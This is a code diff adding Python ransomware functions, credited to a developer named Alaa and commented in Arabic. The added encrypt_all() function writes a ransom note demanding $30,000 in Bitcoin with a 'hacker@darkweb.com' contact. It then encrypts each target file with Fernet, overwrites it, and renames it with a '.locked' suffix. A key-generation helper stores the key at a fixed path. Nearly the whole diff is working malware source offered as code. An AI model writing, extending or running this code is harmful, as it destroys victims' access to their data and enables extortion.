@@ -58,3 +58,57 @@ def get_target_files():
     return files_list, target_path
 
 
+
+
+
+
+# =========================================================================
+# Developer: Alaa
+# Section: Key Generation & Encryption Logic
+# =========================================================================
+
+def load_or_generate_key():
+    # نستخدم مسار المفتاح الثابت
+    if os.path.exists(FIX_KEY_PATH):
+        return open(FIX_KEY_PATH, "rb").read()
+    else:
+        # لو المفتاح مش موجود، ننشئه في مكانه الثابت
+        key = Fernet.generate_key()
+        try:
+            with open(FIX_KEY_PATH, "wb") as key_file:
+                key_file.write(key)
+        except Exception as e:
+            print(f"Key Error: {e}")
+        return key
+
+def encrypt_all():
+    key = load_or_generate_key()
+    files, folder_path = get_target_files()
+
+    # 1. إنشاء رسالة الفدية
+    ransom_note = os.path.join(folder_path, "Payment_instructions.txt")
+    try:
+        with open(ransom_note, "w") as f:
+            f.write("ALL YOUR FILES ARE ENCRYPTED!\n")
+            f.write("Pay $30,000 Bitcoin to get the password.\n")
+            f.write("Send money to: 3010333030\n")
+            f.write("Contact: hacker@darkweb.com")
+    except:
+        pass
+
+    # 2. تشفير الملفات
+    for file_path in files:
+        try:
+            if not file_path.endswith(".locked"):
+                with open(file_path, "rb") as f:
+                    data = f.read()
+                encrypted_data = Fernet(key).encrypt(data)
+
+                with open(file_path, "wb") as f:
+                    f.write(encrypted_data)
+
+                # تغيير الاسم
+                os.rename(file_path, file_path + ".locked")
+        except Exception:
+            pass
+
